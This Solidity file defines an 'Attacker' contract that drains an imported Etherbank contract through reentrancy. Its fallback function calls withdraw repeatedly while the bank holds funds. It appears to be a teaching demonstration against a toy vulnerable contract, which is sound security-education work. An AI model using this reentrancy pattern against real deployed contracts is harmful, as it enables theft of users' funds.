pragma solidity ^0.4.19;

import "./Etherbank.sol";

//Attacking contract

contract Attacker {
    Etherbank victim;
    bool isAttack = false;

    constructor(address _etherbank) public {
        victim = Etherbank(_etherbank);
    }

    function depositToAttacker() public payable {
    }

    function depositFromAttackerToBank() public {
        victim.deposit.value(address(this).balance)();
    }

    function attack() public {

        isAttack = true;
        victim.withdraw(10 ether);
    }

    function getEtherbankAddress() public view returns (Etherbank) {
        return victim;
    }

    function() public payable {
        if (address(victim).balance >= 10 ether) {
            victim.withdraw(10 ether);
        }
    }
}
